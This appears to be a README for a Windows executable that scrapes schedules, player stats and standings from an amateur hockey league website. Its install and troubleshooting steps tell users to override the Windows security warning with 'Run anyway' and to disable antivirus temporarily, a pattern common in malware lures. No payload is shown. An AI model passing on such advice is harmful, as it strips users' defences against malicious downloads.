This software collects schedule information, player statistics, and team standings from the Amherst Adult Hockey League website. It automates the process of visiting the site and saving the data for you. You do not need to know how to write code to use this tool.

📋 What This Program Does

The program gathers up-to-date information directly from the sports league website. It saves this information into a file on your computer. You can use these files to view game times, check player performance, or monitor current league rankings without browsing the live website manually.

  • Fetches game schedules for all teams.
  • Records player points, goals, and assists.
  • Updates team standings in real time.
  • Formats data for easy reading.

💻 System Requirements

To run this tool on your machine, you need a computer that meets these basic standards:

  • Operating System: Windows 10 or Windows 11.
  • Memory: At least 4 gigabytes of RAM.
  • Storage: 200 megabytes of free space.
  • Internet: An active connection to download data.

🚀 How To Install

Follow these steps to set up the software on your Windows computer.

  1. Visit the official download page to see a list of available versions.
  2. Look for the latest release at the top of the list.
  3. Click on the file that ends in .exe to start your download.
  4. Save the file to your desktop or a folder you can find easily.
  5. Double-click the file to open the program.

If Windows shows a security prompt when you open the file, select "More info" and then "Run anyway." This happens because the program is a new tool that Windows does not yet recognize.

⚙️ Using the Program

Once the program window appears, you will see a simple menu. Input the web address of the league page you wish to scan. Press the "Start" button to begin the process. The program will report its progress on the screen. Do not close the window while the program displays a "Working" status.

When the process finishes, the program saves your information into a folder named "Data" which appears next to the program file. You can open these files to view your stats.

🔧 Troubleshooting

If you have problems, check these items:

  • Ensure your internet connection is stable.
  • Disable your antivirus temporarily if it prevents the app from running.
  • Restart the program if the window freezes during the download process.
